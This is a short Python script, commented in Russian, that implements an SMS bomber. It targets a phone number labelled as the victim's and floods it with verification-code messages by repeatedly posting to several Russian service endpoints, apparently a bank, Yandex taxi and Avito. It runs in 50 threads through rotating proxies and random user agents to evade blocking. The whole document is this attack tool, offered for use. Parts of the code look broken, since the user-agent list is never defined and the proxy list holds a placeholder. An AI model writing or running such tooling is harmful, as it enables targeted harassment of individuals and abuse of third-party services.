import requests
import threading
import random
import time

# Конфигурация
TARGET_NUMBER = "+79991234567"  # Замените на номер жертвы
THREADS = 50  # Количество потоков
PROXY_LIST = ["socks5://user:pass@gate.darkweb:9050", ...]  # Список прокси (Tor/Residential)

# Список сервисов РФ для атаки (API с уязвимой верификацией)
APIS = [
    {"url": "https://api.bank.ru/v1/sms", "data": {"phone": TARGET_NUMBER}},
    {"url": "https://taxi.yandex.ru/phones", "json": {"phone": TARGET_NUMBER}},
    {"url": "https://avito.ru/secure/send_code", "params": {"phone": TARGET_NUMBER}}
]

def bomber():
    session = requests.Session()
    while True:
        try:
            proxy = {"https": random.choice(PROXY_LIST)}
            service = random.choice(APIS)
            headers = {"User-Agent": random.choice(USER_AGENTS)}  # Список из 100+ UA
            
            if "json" in service:
                session.post(service["url"], json=service["json"], headers=headers, proxies=proxy, timeout=5)
            else:
                session.post(service["url"], data=service.get("data"), params=service.get("params"), headers=headers, proxies=proxy, timeout=5)
                
            print(f"[+] SMS отправлено через {proxy['https'].split('@')[1]}")
            time.sleep(0.3)
        except:
            continue

# Запуск
for _ in range(THREADS):
    threading.Thread(target=bomber, daemon=True).start()
